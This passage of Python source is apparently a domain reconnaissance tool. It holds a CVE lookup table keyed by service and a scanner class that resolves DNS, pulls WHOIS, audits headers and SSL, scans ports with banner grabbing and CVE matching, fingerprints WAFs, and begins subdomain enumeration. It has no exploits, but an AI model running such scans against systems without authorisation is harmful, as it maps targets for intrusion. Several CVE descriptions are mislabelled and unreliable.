    ("redis","CVE-2021-32761","Out-of-bound read via BITFIELD — CVSS 8.1"),
    ("redis","CVE-2021-32762","Heap overflow in redis-cli — CVSS 8.8"),
    ("redis","CVE-2021-29477","Integer overflow SETRANGE — CVSS 8.8"),
    ("redis","CVE-2020-14147","Denial of service via LPOS — CVSS 7.5"),
    # Memcached
    ("memcached","CVE-2018-1000115","UDP amplification — CVSS 7.5"),
    ("memcached","CVE-2016-8704","Integer overflow — CVSS 9.8 RCE"),
    # SSH / OpenSSH
    ("ssh","CVE-2023-38408","Remote code execution via PKCS11 — CVSS 9.8"),
    ("ssh","CVE-2023-25136","Double-free in sshd — CVSS 6.5"),
    ("ssh","CVE-2021-28041","Double-free in ssh-agent — CVSS 7.1"),
    ("ssh","CVE-2019-6111","SCP client path traversal — CVSS 5.9"),
    ("ssh","CVE-2018-15473","Username enumeration — CVSS 5.3"),
    ("ssh","CVE-2016-10009","sshd agent forwarding priv escalation — CVSS 7.3"),
    # FTP
    ("ftp","CVE-2020-9273","ProFTPD RCE via memory corruption — CVSS 8.8"),
    ("ftp","CVE-2019-12815","ProFTPD arbitrary file copy — CVSS 9.8"),
    ("ftp","CVE-2015-3306","ProFTPD mod_copy unauth file copy — CVSS 10.0"),
    ("ftp","CVE-2011-4130","vsftpd 2.3.4 backdoor — CVSS 10.0"),
    # Telnet
    ("telnet","CVE-2011-4862","BSD Telnetd buffer overflow — CVSS 10.0 RCE"),
    ("telnet","CVE-2020-10188","telnetd buffer overflow — CVSS 9.8"),
    # SMB / Samba
    ("smb","CVE-2021-44142","Samba heap overflow — CVSS 9.9 RCE"),
    ("smb","CVE-2020-0796","SMBGhost Windows RCE — CVSS 10.0"),
    ("smb","CVE-2017-0144","EternalBlue — WannaCry CVSS 9.3 RCE"),
    ("smb","CVE-2017-0145","EternalRomance — CVSS 9.3 RCE"),
    ("smb","CVE-2017-7494","SambaCry — CVSS 7.5 RCE"),
    ("samba","CVE-2022-32744","Kerberos forged PAC — CVSS 8.8"),
    ("samba","CVE-2021-20254","Buffer overflow via sid mapping — CVSS 6.8"),
    # RDP
    ("rdp","CVE-2019-0708","BlueKeep — CVSS 9.8 pre-auth RCE"),
    ("rdp","CVE-2020-0609","Windows RDS RCE — CVSS 9.8"),
    ("rdp","CVE-2021-34535","RDP client RCE — CVSS 8.8"),
    ("rdp","CVE-2022-21893","RDP information disclosure — CVSS 8.0"),
    # WordPress
    ("wordpress","CVE-2022-21662","XSS via post slugs — CVSS 5.4"),
    ("wordpress","CVE-2021-29447","XXE in media library — CVSS 7.1"),
    ("wordpress","CVE-2020-28032","Object injection via plugins — CVSS 9.8"),
    ("wordpress","CVE-2019-8943","Path traversal in media handler — CVSS 6.5"),
    ("wordpress","CVE-2019-17671","Unauthenticated view of private posts — CVSS 5.3"),
    ("wordpress","CVE-2022-3590","SSRF in PingBack — CVSS 5.9"),
    ("wordpress","CVE-2023-2745","Directory traversal — CVSS 5.4"),
    ("wp","CVE-2022-21663","Object injection in WP core — CVSS 7.2"),
    ("wp","CVE-2021-29450","XXE via media upload — CVSS 7.1"),
    # Joomla
    ("joomla","CVE-2023-23752","API unauthorized access — CVSS 5.3"),
    ("joomla","CVE-2021-23132","ACL bypass in webservice — CVSS 7.5"),
    ("joomla","CVE-2020-11890","Stored XSS in custom fields — CVSS 6.1"),
    ("joomla","CVE-2015-8562","PHP object injection RCE — CVSS 10.0"),
    ("joomla","CVE-2017-8917","SQL injection in search — CVSS 9.8"),
    # Drupal
    ("drupal","CVE-2018-7600","Drupalgeddon2 — CVSS 9.8 RCE"),
    ("drupal","CVE-2018-7602","Remote code execution — CVSS 9.8"),
    ("drupal","CVE-2019-6340","REST API RCE — CVSS 9.8"),
    ("drupal","CVE-2020-13671","Unrestricted file upload — CVSS 8.8"),
    ("drupal","CVE-2022-25275","Authentication bypass — CVSS 9.1"),
    # Tomcat
    ("tomcat","CVE-2020-1938","Ghostcat — AJP file read RCE CVSS 9.8"),
    ("tomcat","CVE-2019-0232","CGI Servlet RCE on Windows — CVSS 8.1"),
    ("tomcat","CVE-2017-12617","JSP upload via PUT — CVSS 8.1"),
    ("tomcat","CVE-2016-8735","Deserialization via JmxRemoteLifecycleListener CVSS 9.8"),
    ("tomcat","CVE-2022-42252","Partial PUT RCE — CVSS 9.8"),
    # Jenkins
    ("jenkins","CVE-2023-27898","Stored XSS via plugin — CVSS 8.0"),
    ("jenkins","CVE-2022-2048","Password spray via login — CVSS 7.5"),
    ("jenkins","CVE-2019-1003000","Script approval sandbox bypass RCE — CVSS 8.8"),
    ("jenkins","CVE-2018-1000861","Groovy sandbox escape — CVSS 9.8"),
    ("jenkins","CVE-2016-0792","Java deserialization RCE — CVSS 9.8"),
    # GitLab
    ("gitlab","CVE-2022-2185","CSRF via import — CVSS 8.8"),
    ("gitlab","CVE-2021-22205","Remote code execution via ExifTool — CVSS 10.0"),
    ("gitlab","CVE-2022-1162","Hardcoded password for OmniAuth — CVSS 9.1"),
    ("gitlab","CVE-2023-3932","Privilege escalation — CVSS 8.8"),
    # phpMyAdmin
    ("phpmyadmin","CVE-2020-26934","Stored XSS via QBE — CVSS 6.1"),
    ("phpmyadmin","CVE-2019-12616","CSRF via designer — CVSS 6.1"),
    ("phpmyadmin","CVE-2018-12613","Local file inclusion — CVSS 8.8"),
    ("phpmyadmin","CVE-2016-5734","Remote code execution — CVSS 9.8"),
    # Elasticsearch
    ("elasticsearch","CVE-2021-22145","Information disclosure — CVSS 6.5"),
    ("elasticsearch","CVE-2019-7616","Elevation of privilege — CVSS 8.8"),
    ("elasticsearch","CVE-2015-1427","Groovy sandbox escape — CVSS 10.0"),
    # Kibana
    ("kibana","CVE-2019-7609","Prototype pollution RCE — CVSS 10.0"),
    ("kibana","CVE-2022-23708","SSRF via Alerting — CVSS 4.3"),
    # Grafana
    ("grafana","CVE-2021-43798","Path traversal — CVSS 7.5 read arbitrary files"),
    ("grafana","CVE-2022-26148","Stored credentials in plain text — CVSS 9.8"),
    # Struts
    ("struts","CVE-2017-5638","Jakarta Multipart parser RCE — CVSS 10.0 (Equifax)"),
    ("struts","CVE-2018-11776","RCE via namespace — CVSS 10.0"),
    ("struts","CVE-2019-0230","OGNL expression injection — CVSS 9.8"),
    # Spring
    ("spring","CVE-2022-22965","Spring4Shell — CVSS 9.8 RCE"),
    ("spring","CVE-2022-22950","ReDoS in Spring Security — CVSS 6.5"),
    ("spring","CVE-2018-1270","SpEL injection RCE — CVSS 9.8"),
    # Node.js / Express
    ("nodejs","CVE-2022-32212","DNS rebinding via hosts — CVSS 8.1"),
    ("nodejs","CVE-2021-22931","Prototype pollution — CVSS 9.8"),
    ("express","CVE-2022-24999","Prototype pollution via qs — CVSS 7.5"),
    # SSL/TLS
    ("ssl","CVE-2014-0160","Heartbleed — CVSS 7.5 mem leak"),
    ("ssl","CVE-2014-3566","POODLE — CVSS 3.4 SSLv3 downgrade"),
    ("ssl","CVE-2015-0291","OpenSSL ClientHello sigalgs DoS — CVSS 5.0"),
    ("ssl","CVE-2016-2107","LUCKY13 padding oracle — CVSS 5.9"),
    ("ssl","CVE-2021-3449","OpenSSL TLS renegotiation NULL deref — CVSS 5.9"),
    ("tls","CVE-2020-1967","OpenSSL sig_algs NULL deref — CVSS 7.5"),
    # SMTP
    ("smtp","CVE-2021-44142","Postfix/Cyrus buffer overflow"),
    ("smtp","CVE-2020-7247","OpenSMTPD RCE — CVSS 10.0"),
    ("smtp","CVE-2019-16928","Exim heap overflow — CVSS 9.8"),
    ("smtp","CVE-2018-6789","Exim base64 decode heap overflow — CVSS 9.8"),
    # DNS
    ("dns","CVE-2021-25216","BIND buffer overflow — CVSS 8.1"),
    ("dns","CVE-2020-8617","BIND assertion failure — CVSS 7.5"),
    ("dns","CVE-2020-8616","BIND NXNS attack — CVSS 8.6"),
    # Docker
    ("docker","CVE-2019-5736","runc container escape — CVSS 8.6"),
    ("docker","CVE-2020-15257","Shimmer Unix socket escape — CVSS 5.2"),
    # Kubernetes
    ("kubernetes","CVE-2019-11253","YAML bomb DoS — CVSS 7.5"),
    ("kubernetes","CVE-2018-1002105","Privilege escalation via API — CVSS 9.8"),
    # vBulletin
    ("vbulletin","CVE-2019-16759","PHP object injection RCE — CVSS 9.8"),
    ("vbulletin","CVE-2020-17496","RCE via subWidgets — CVSS 9.8"),
    ("vbulletin","CVE-2021-27931","XSS via post — CVSS 6.1"),
    # HTTP Alt ports
    ("http-alt","CVE-2021-21985","VMware vCenter RCE via VPX — CVSS 9.8"),
    ("http-alt","CVE-2022-0540","Jira auth bypass — CVSS 9.8"),
    ("dev","CVE-2021-26084","Confluence OGNL injection RCE — CVSS 9.8"),
    # WinRM
    ("winrm","CVE-2021-31166","HTTP RCE via protocol stack — CVSS 9.8"),
    # Generic web
    ("http","CVE-2021-44228","Log4Shell — JNDI RCE CVSS 10.0"),
    ("https","CVE-2021-44228","Log4Shell — JNDI RCE CVSS 10.0"),
    ("http","CVE-2022-41040","ProxyNotShell — SSRF + RCE CVSS 8.8"),
    ("http","CVE-2022-41082","ProxyNotShell PowerShell RCE — CVSS 8.8"),
    ("https","CVE-2022-41040","ProxyNotShell — SSRF + RCE CVSS 8.8"),
    # ── FW3.7 additions ──────────────────────────────────────────
    # MikroTik RouterOS
    ("mikrotik","CVE-2023-30799","RouterOS RCE via Winbox — CVSS 9.1"),
    ("mikrotik","CVE-2021-41987","RouterOS heap overflow — CVSS 8.1"),
    ("mikrotik","CVE-2019-3977","RouterOS DNS cache poisoning — CVSS 7.5"),
    ("mikrotik","CVE-2018-14847","Winbox arbitrary file read — CVSS 9.1"),
    # Cisco
    ("cisco","CVE-2023-20198","IOS XE web UI RCE — CVSS 10.0"),
    ("cisco","CVE-2023-20273","IOS XE privilege escalation — CVSS 7.2"),
    ("cisco","CVE-2021-1498","HyperFlex RCE — CVSS 9.8"),
    # FortiGate
    ("fortinet","CVE-2023-27997","FortiOS heap overflow — CVSS 9.8 RCE"),
    ("fortinet","CVE-2022-42475","FortiOS SSL-VPN RCE — CVSS 9.8"),
    ("fortinet","CVE-2022-40684","FortiOS auth bypass — CVSS 9.8"),
    # TP-Link
    ("tp-link","CVE-2023-1389","Archer AX21 command injection — CVSS 8.8"),
    # Synology
    ("synology","CVE-2022-27617","Synology NAS path traversal — CVSS 7.5"),
    ("synology","CVE-2021-29086","Synology DSM arbitrary file read — CVSS 7.5"),
    # QNAP
    ("qnap","CVE-2022-27596","QNAP NAS SQL injection — CVSS 9.8"),
    ("qnap","CVE-2021-28806","QNAP RCE via QTS — CVSS 9.8"),
    # Cameras
    ("hikvision","CVE-2021-36260","Hikvision IP camera RCE — CVSS 9.8"),
    ("dahua","CVE-2021-33044","Dahua auth bypass — CVSS 9.8"),
    # VNC
    ("vnc","CVE-2019-8287","TightVNC stack buffer overflow — CVSS 9.8"),
    ("vnc","CVE-2022-4283","VNC auth bypass via clipboard — CVSS 7.8"),
    # Grafana expanded
    ("grafana","CVE-2023-3128","Grafana auth bypass — CVSS 9.4"),
    ("grafana","CVE-2023-22462","Grafana stored XSS — CVSS 7.1"),
    # GitLab expanded
    ("gitlab","CVE-2023-2825","Path traversal — CVSS 10.0"),
    ("gitlab","CVE-2023-7028","Account takeover via email — CVSS 10.0"),
    # Confluence
    ("confluence","CVE-2023-22515","Broken access control — CVSS 10.0"),
    ("confluence","CVE-2022-26134","OGNL injection RCE — CVSS 9.8"),
    ("confluence","CVE-2021-26084","OGNL injection RCE — CVSS 9.8"),
    # Exchange / ProxyShell
    ("exchange","CVE-2021-34473","ProxyShell pre-auth RCE — CVSS 9.8"),
    ("exchange","CVE-2021-34523","ProxyShell elevation — CVSS 9.8"),
    ("exchange","CVE-2021-31207","ProxyShell post-auth RCE — CVSS 7.2"),
    ("exchange","CVE-2021-26855","ProxyLogon SSRF — CVSS 9.8"),
    # Log4j expanded
    ("log4j","CVE-2021-44228","Log4Shell JNDI injection — CVSS 10.0"),
    ("log4j","CVE-2021-45046","Log4j DoS + RCE bypass — CVSS 9.0"),
    ("log4j","CVE-2021-45105","Log4j recursive lookup DoS — CVSS 5.9"),
    # Elasticsearch expanded
    ("elasticsearch","CVE-2023-31580","Elasticsearch SSRF — CVSS 6.5"),
    ("elasticsearch","CVE-2022-23708","Elasticsearch priv escalation — CVSS 8.8"),
    # RabbitMQ
    ("rabbitmq","CVE-2022-37026","Erlang auth bypass — CVSS 9.8"),
    # Consul
    ("consul","CVE-2023-1297","Consul cross-namespace ACL bypass — CVSS 8.1"),
    # Vault
    ("vault","CVE-2023-24999","Vault PKI revocation bypass — CVSS 6.5"),
    # pfSense
    ("pfsense","CVE-2022-31814","pfSense RCE via pfBlocker — CVSS 9.8"),
    ("pfsense","CVE-2021-41282","pfSense command injection — CVSS 8.8"),
    # OpenWrt
    ("openwrt","CVE-2020-7982","OpenWrt package injection — CVSS 8.1"),
    # Zyxel
    ("zyxel","CVE-2022-30525","Zyxel firewall OS command injection — CVSS 9.8"),
    ("zyxel","CVE-2023-28771","Zyxel IKE command injection — CVSS 9.8"),
    # Webmin
    ("webmin","CVE-2019-15107","Webmin RCE via password_change — CVSS 9.8"),
    ("webmin","CVE-2022-0824","Webmin arbitrary file access — CVSS 9.8"),
    # MinIO
    ("minio","CVE-2023-28432","MinIO env var information disclosure — CVSS 7.5"),
    # Harbor
    ("harbor","CVE-2022-46463","Harbor unauth image pull — CVSS 7.5"),
]

def init_cve_db():
    conn = sqlite3.connect(_CVE_DB_PATH)
    cur  = conn.cursor()
    cur.execute("""CREATE TABLE IF NOT EXISTS services (
        id INTEGER PRIMARY KEY AUTOINCREMENT,
        name TEXT NOT NULL COLLATE NOCASE,
        cve_id TEXT NOT NULL,
        description TEXT
    )""")
    cur.execute("SELECT COUNT(*) FROM services")
    if cur.fetchone()[0] < len(CVE_DATA):
        cur.execute("DELETE FROM services")
        cur.executemany(
            "INSERT INTO services (name,cve_id,description) VALUES (?,?,?)",
            CVE_DATA
        )
        conn.commit()
    conn.close()

def query_cve(service_name: str) -> list:
    if not os.path.exists(_CVE_DB_PATH):
        return []
    conn = sqlite3.connect(_CVE_DB_PATH)
    cur  = conn.cursor()
    cur.execute(
        "SELECT cve_id, description FROM services WHERE name LIKE ?",
        (f"%{service_name.lower()}%",)
    )
    rows = cur.fetchall()
    conn.close()
    return rows

def get_all_cve_count() -> int:
    if not os.path.exists(_CVE_DB_PATH):
        return 0
    conn = sqlite3.connect(_CVE_DB_PATH)
    c = conn.cursor()
    c.execute("SELECT COUNT(*) FROM services")
    n = c.fetchone()[0]
    conn.close()
    return n


# ═══════════════════════════════════════════════════════════════
# CORE SCANNER
# ═══════════════════════════════════════════════════════════════
class DomainScanner:
    PORTS = {
        21:"FTP", 22:"SSH", 23:"Telnet", 25:"SMTP", 53:"DNS",
        80:"HTTP", 110:"POP3", 143:"IMAP", 443:"HTTPS", 445:"SMB",
        587:"SMTPS", 993:"IMAPS", 995:"POP3S", 1433:"MSSQL",
        3306:"MySQL", 3389:"RDP", 4848:"GlassFish", 5432:"PostgreSQL",
        5900:"VNC", 6379:"Redis", 8080:"HTTP-Alt", 8443:"HTTPS-Alt",
        8888:"Dev", 9200:"Elasticsearch", 9300:"ES-Transport",
        11211:"Memcached", 27017:"MongoDB", 28017:"Mongo-Web",
    }
    SECURITY_HEADERS = [
        "Strict-Transport-Security", "Content-Security-Policy",
        "X-Frame-Options", "X-Content-Type-Options", "X-XSS-Protection",
        "Referrer-Policy", "Permissions-Policy",
    ]

    def __init__(self, domain: str, log_cb=None, prog_cb=None):
        self.domain   = re.sub(r'^https?://', '', domain.strip().lower()).split('/')[0].split('?')[0]
        self.log_cb   = log_cb  or (lambda m, l: print(f"[{l}] {m}"))
        self.prog_cb  = prog_cb or (lambda v: None)
        self.results  = {}
        self.log_lines= []
        self.cancelled= False
        self.start_time = None

    def _log(self, msg: str, level: str = "INFO"):
        ts = datetime.now().strftime("%H:%M:%S")
        self.log_lines.append(f"[{ts}] {msg}")
        self.log_cb(msg, level)

    def _prog(self, v: int):
        self.prog_cb(min(100, max(0, int(v))))

    def resolve_dns(self):
        self._log("Resolving domain to IP address...", "STEP"); self._prog(4)
        r = {"ips": [], "ipv6": [], "reverse_dns": "N/A", "error": None}
        try:
            info = socket.getaddrinfo(self.domain, None)
            seen = {}
            for i in info:
                ip, fam = i[4][0], i[0]
                if ip not in seen:
                    seen[ip] = 1
                    (r["ips"] if fam == socket.AF_INET else r["ipv6"]).append(ip)
            for ip in r["ips"]:  self._log(f"  IPv4            : {ip}", "FOUND")
            for ip in r["ipv6"]: self._log(f"  IPv6            : {ip}", "FOUND")
            tgt = r["ips"][0] if r["ips"] else (r["ipv6"][0] if r["ipv6"] else None)
            if tgt:
                try:
                    rdns = socket.gethostbyaddr(tgt)[0]
                    r["reverse_dns"] = rdns
                    self._log(f"  Reverse DNS     : {rdns}", "FOUND")
                except:
                    self._log("  Reverse DNS     : N/A", "WARN")
        except socket.gaierror as e:
            r["error"] = str(e)
            self._log(f"  Cannot resolve  : {e}", "ERROR")
        self.results["resolution"] = r; self._prog(14)

    def check_dns_records(self):
        self._log("Checking DNS records (A,AAAA,MX,NS,TXT,CNAME,SOA)...", "STEP"); self._prog(18)
        r = {}
        if DNS_OK:
            for rtype in ["A","AAAA","MX","NS","TXT","CNAME","SOA"]:
                try:
                    ans = dns.resolver.resolve(self.domain, rtype, lifetime=6)
                    records = [str(a) for a in ans]
                    r[rtype] = records
                    for rec in records:
                        self._log(f"  {rtype:<6}          : {rec[:74]}", "FOUND")
                except dns.resolver.NXDOMAIN:
                    self._log("  NXDOMAIN — domain not found", "ERROR"); break
                except (dns.resolver.NoAnswer, dns.exception.Timeout): pass
                except Exception as e:
                    self._log(f"  {rtype}: {str(e)[:60]}", "WARN")
        else:
            try:
                ip = socket.gethostbyname(self.domain)
                r["A"] = [ip]
                self._log(f"  A               : {ip}", "FOUND")
                self._log("  Tip: pip install dnspython for full DNS analysis", "WARN")
            except Exception as e:
                self._log(f"  DNS failed: {e}", "ERROR")
        self.results["dns_records"] = r; self._prog(28)

    def get_whois(self):
        self._log("Retrieving WHOIS information...", "STEP"); self._prog(31)
        r = {}
        if not WHOIS_OK:
            self._log("  Tip: pip install python-whois", "WARN")
            r["error"] = "module missing"; self.results["whois"] = r; self._prog(44); return
        try:
            w = whois.whois(self.domain)
            def sg(a):
                v = getattr(w, a, None)
                return v[0] if isinstance(v, list) else v
            for k, lbl in [("registrar","Registrar"),("creation_date","Registered"),
                            ("expiration_date","Expires"),("org","Organization"),
                            ("country","Country"),("emails","Contact"),("dnssec","DNSSEC")]:
                v = sg(k)
                if v:
                    r[k] = str(v)
                    self._log(f"  {lbl:<16} : {str(v)[:62]}", "FOUND")
            exp = sg("expiration_date")
            if exp and hasattr(exp, "date"):
                try:
                    import datetime as _dt_mod
                    now = datetime.now()
                    # If exp is timezone-aware, make now timezone-aware too (UTC)
                    if hasattr(exp, 'tzinfo') and exp.tzinfo is not None:
                        import datetime as _dtm
                        now = _dtm.datetime.now(_dtm.timezone.utc)
                    days = (exp - now).days
                    r["days_until_expiry"] = days
                    if   days < 0:  self._log(f"  Domain EXPIRED {abs(days)} days ago!", "ERROR")
                    elif days < 30: self._log(f"  Expires in {days} days — URGENT", "WARN")
                    elif days < 90: self._log(f"  Expires in {days} days", "WARN")
                    else:           self._log(f"  Expires in     : {days} days", "INFO")
                except Exception:
                    pass
        except Exception as e:
            r["error"] = str(e)
            self._log(f"  WHOIS failed: {str(e)[:100]}", "ERROR")
        self.results["whois"] = r; self._prog(44)

    def analyze_http_headers(self):
        self._log("Analyzing HTTP headers and security posture...", "STEP"); self._prog(48)
        r = {"status_code": None, "server": None, "protocol": None, "headers": {},
             "redirects_to_https": False, "technologies": [], "security_headers": {}, "score": 0}
        raw = {}
        for proto in ("https", "http"):
            url = f"{proto}://{self.domain}"
            try:
                req = Request(url, headers={"User-Agent": "Mozilla/5.0 (WebGate/3.0 SecurityAudit)"})
                with urlopen(req, timeout=10) as resp:
                    raw = dict(resp.headers)
                    r["status_code"] = resp.status
                    r["protocol"] = proto.upper()
                    r["redirects_to_https"] = resp.url.startswith("https://")
                    self._log(f"  Status          : {resp.status} ({proto.upper()})", "FOUND")
                    if resp.url != url:
                        self._log(f"  Redirect        : {resp.url[:70]}", "FOUND")
                    break
            except HTTPError as e:
                raw = dict(e.headers) if hasattr(e, "headers") else {}
                r["status_code"] = e.code
                r["protocol"] = proto.upper()
                self._log(f"  Status          : {e.code} ({proto.upper()})", "FOUND")
                break
            except Exception as e:
                self._log(f"  {proto.upper()} fail: {str(e)[:65]}", "WARN")
        r["headers"] = raw
        for h, lbl in [("Server","Server"),("X-Powered-By","Backend"),("X-Generator","Generator")]:
            if h in raw:
                v = raw[h]
                r["technologies"].append(f"{lbl}: {v}")
                if h == "Server": r["server"] = v
                self._log(f"  {lbl:<16} : {v[:60]}", "FOUND")
        if not r["redirects_to_https"] and r["protocol"] == "HTTP":
            self._log("  HTTPS redirect  : NOT enforced", "WARN")
        self._log("  Security headers audit:", "INFO")
        score = 0
        for h in self.SECURITY_HEADERS:
            ok = h in raw
            r["security_headers"][h] = ok
            self._log(f"    {'✓' if ok else '✗'} {h}", "FOUND" if ok else "WARN")
            if ok: score += 1
        r["score"] = score
        self._log(f"  Security score  : {score}/{len(self.SECURITY_HEADERS)}", "INFO")
        self.results["http"] = r; self._prog(60)

    def check_ssl(self):
        self._log("Checking SSL/TLS certificate...", "STEP"); self._prog(63)
        r = {"available": False, "version": None, "cipher": None, "bits": None,
             "common_name": None, "issuer": None, "not_after": None,
             "days_until_expiry": None, "san": [], "self_signed": False,
             "wildcard": False, "error": None}
        try:
            ctx = ssl.create_default_context()
            with socket.create_connection((self.domain, 443), timeout=10) as raw:
                with ctx.wrap_socket(raw, server_hostname=self.domain) as ss:
                    r["available"] = True
                    r["version"]   = ss.version()
                    c = ss.cipher()
                    if c: r["cipher"] = c[0]; r["bits"] = c[2]
                    cert = ss.getpeercert()
                    subj = dict(x[0] for x in cert.get("subject", []))
                    iss  = dict(x[0] for x in cert.get("issuer", []))
                    r["common_name"] = subj.get("commonName", "N/A")
                    r["issuer"]      = iss.get("organizationName", "N/A")
                    r["not_after"]   = cert.get("notAfter", "N/A")
                    r["self_signed"] = subj == iss
                    r["wildcard"]    = r["common_name"].startswith("*.")
                    self._log(f"  TLS version     : {r['version']}", "FOUND")
                    self._log(f"  Cipher          : {r['cipher']} ({r['bits']} bits)", "FOUND")
                    self._log(f"  Common name     : {r['common_name']}", "FOUND")
                    self._log(f"  Issuer          : {r['issuer']}", "FOUND")
                    if r["self_signed"]:
                        self._log("  Self-signed cert detected!", "WARN")
                    try:
                        exp  = datetime.strptime(r["not_after"], "%b %d %H:%M:%S %Y %Z")
                        days = (exp - datetime.now()).days
                        r["days_until_expiry"] = days
                        self._log(f"  Valid until     : {r['not_after']}", "FOUND")
                        if   days < 0:  self._log(f"  Certificate EXPIRED!", "ERROR")
                        elif days < 15: self._log(f"  Expires in {days}d — CRITICAL", "ERROR")
                        elif days < 30: self._log(f"  Expires in {days}d", "WARN")
                        else:           self._log(f"  Days remaining  : {days}", "FOUND")
                    except: pass
                    sans = cert.get("subjectAltName", [])
                    r["san"] = [v for _, v in sans]
                    self._log(f"  Alt names (SAN) : {len(sans)} entries", "INFO")
                    for _, sv in sans[:8]:
                        self._log(f"    · {sv}", "INFO")
                    if len(sans) > 8:
                        self._log(f"    … +{len(sans)-8} more", "INFO")
        except ssl.SSLCertVerificationError as e:
            r["error"] = str(e)
            self._log(f"  Cert verify failed: {str(e)[:80]}", "ERROR")
        except ConnectionRefusedError:
            r["error"] = "Port 443 closed"
            self._log("  Port 443 closed — no HTTPS", "WARN")
        except socket.timeout:
            r["error"] = "timeout"
            self._log("  SSL connection timed out", "ERROR")
        except Exception as e:
            r["error"] = str(e)
            self._log(f"  SSL error: {str(e)[:100]}", "ERROR")
        self.results["ssl"] = r; self._prog(76)

    def scan_ports(self, ask_cb=None):
        self._log("Scanning common ports (threaded)...", "STEP"); self._prog(79)
        r = {"target_ip": None, "open": [], "closed": [], "filtered": []}
        try:    r["target_ip"] = socket.gethostbyname(self.domain)
        except: r["target_ip"] = self.domain
        tgt = r["target_ip"]; total = len(self.PORTS)
        _lock = threading.Lock()
        _done = [0]

        def _scan_one(port, svc):
            if self.cancelled: return
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(1.2)
                res = s.connect_ex((tgt, port))
                s.close()
                if res == 0:
                    banner = self._banner(tgt, port)
                    cves   = query_cve(svc.lower())
                    with _lock:
                        r["open"].append({"port": port, "service": svc,
                                          "banner": banner, "cves": cves})
                    cve_str = f"  [{len(cves)} CVE]" if cves else ""
                    self._log(
                        f"  {port:5}/tcp  OPEN    {svc:<14}"
                        f"{'  ['+banner[:28]+']' if banner else ''}{cve_str}", "FOUND"
                    )
                    for cve_id, desc in cves[:3]:
                        self._log(f"    ⚡ {cve_id}: {desc[:60]}", "WARN")
                else:
                    with _lock: r["closed"].append(port)
            except socket.timeout:
                with _lock: r["filtered"].append(port)
            except:
                with _lock: r["closed"].append(port)
            with _lock:
                _done[0] += 1
                self._prog(79 + int(_done[0] / total * 9))

        if ask_cb:
            # Sequential if user wants per-port confirmation
            for port, svc in self.PORTS.items():
                if self.cancelled: break
                ans = ask_cb(port, svc)
                if ans == "skip": r["closed"].append(port); continue
                if ans == "all":  ask_cb = None; break
                _scan_one(port, svc)
            if not ask_cb:
                # User said "all" — scan remaining in parallel
                remaining = {p: s for p, s in self.PORTS.items()
                             if p not in [x["port"] for x in r["open"]]
                             and p not in r["closed"] and p not in r["filtered"]}
                with ThreadPoolExecutor(max_workers=20) as pool:
                    for port, svc in remaining.items():
                        pool.submit(_scan_one, port, svc)
        else:
            with ThreadPoolExecutor(max_workers=20) as pool:
                for port, svc in self.PORTS.items():
                    pool.submit(_scan_one, port, svc)

        # Sort open ports by port number
        r["open"].sort(key=lambda x: x["port"])
        self._log(f"  Open: {len(r['open'])}  Closed: {len(r['closed'])}  Filtered: {len(r['filtered'])}", "INFO")
        self.results["ports"] = r; self._prog(90)

    def _banner(self, ip: str, port: int) -> str:
        try:
            s = socket.socket(); s.settimeout(0.8)
            s.connect((ip, port))
            if port in (80, 8080): s.send(b"HEAD / HTTP/1.0\r\n\r\n")
            raw = s.recv(256).decode("utf-8", errors="ignore").strip()
            s.close()
            return " ".join(raw.split())[:50]
        except:
            return ""

    def detect_waf(self):
        """Detect WAF/CDN (Cloudflare, Akamai, AWS Shield, Sucuri, etc.)."""
        self._log("Detecting WAF / CDN...", "STEP")
        r = {"detected": False, "waf": "None", "indicators": []}

        # Check via HTTP headers
        for proto in ("https", "http"):
            try:
                url = f"{proto}://{self.domain}"
                req = Request(url, headers={"User-Agent": "Mozilla/5.0 (WebGate/4.0 SecurityAudit)"})
                with urlopen(req, timeout=8) as resp:
                    headers = {k.lower(): v for k, v in resp.headers.items()}

                    waf_sigs = [
                        (["cf-ray", "cf-cache-status"], "server", "cloudflare", "Cloudflare"),
                        (["x-sucuri-id", "x-sucuri-cache"], "server", "sucuri", "Sucuri WAF"),
                        (["x-akamai-transformed"], "server", "akamai", "Akamai"),
                        (["x-amz-cf-id", "x-amz-cf-pop"], "server", "amazo", "AWS CloudFront"),
                        (["x-cdn"], "server", "incapsula", "Imperva Incapsula"),
                        ([], "server", "ddos-guard", "DDoS-Guard"),
                        ([], "server", "yunjiasu", "Baidu Yunjiasu"),
                        (["x-fw-hash"], "server", "wordfence", "Wordfence"),
                        ([], "server", "stackpath", "StackPath"),
                        (["x-fastly-request-id"], "server", "fastly", "Fastly CDN"),
                        ([], "server", "varnish", "Varnish Cache"),
                    ]

                    for extra_headers, hdr_key, sig, name in waf_sigs:
                        found = False
                        for eh in extra_headers:
                            if eh in headers:
                                found = True
                                r["indicators"].append(f"Header: {eh}")
                        if sig in headers.get(hdr_key, "").lower():
                            found = True
                            r["indicators"].append(f"Server: {headers.get(hdr_key, '')}")
                        if found:
                            r["detected"] = True
                            r["waf"] = name
                            self._log(f"  WAF detected    : {name}", "WARN")
                            break

                    # Cookie-based detection
                    cookies = headers.get("set-cookie", "")
                    cookie_sigs = {
                        "__cfduid": "Cloudflare", "sucuri_": "Sucuri",
                        "incap_ses": "Incapsula", "visid_incap": "Incapsula",
                        "ak_bmsc": "Akamai", "bm_sz": "Akamai",
                    }
                    for csig, cname in cookie_sigs.items():
                        if csig in cookies.lower():
                            r["detected"] = True
                            r["waf"] = cname
                            r["indicators"].append(f"Cookie: {csig}")
                            self._log(f"  WAF via cookie  : {cname}", "WARN")
                            break

                    if not r["detected"]:
                        self._log("  No WAF detected", "INFO")
                    break
            except:
                continue

        # IP-based Cloudflare check
        if not r["detected"]:
            try:
                ip = socket.gethostbyname(self.domain)
                cf_prefixes = ["103.21.", "103.22.", "103.31.", "104.16.", "104.17.",
                               "104.18.", "104.19.", "104.20.", "104.21.", "104.22.",
                               "104.23.", "104.24.", "104.25.", "104.26.", "104.27.",
                               "108.162.", "141.101.", "162.158.", "172.64.", "172.65.",
                               "172.66.", "172.67.", "173.245.", "188.114.", "190.93.",
                               "197.234.", "198.41."]
                if any(ip.startswith(p) for p in cf_prefixes):
                    r["detected"] = True
                    r["waf"] = "Cloudflare (IP range)"
                    r["indicators"].append(f"IP {ip} in CF range")
                    self._log(f"  Cloudflare IP   : {ip}", "WARN")
            except:
                pass

        self.results["waf"] = r

    def enumerate_subdomains(self):
        """Built-in subdomain enumeration via DNS brute + common names."""
        self._log("Enumerating subdomains...", "STEP")
        subs_found = []
        common_subs = [
            "www", "mail", "ftp", "smtp", "pop", "imap", "webmail",
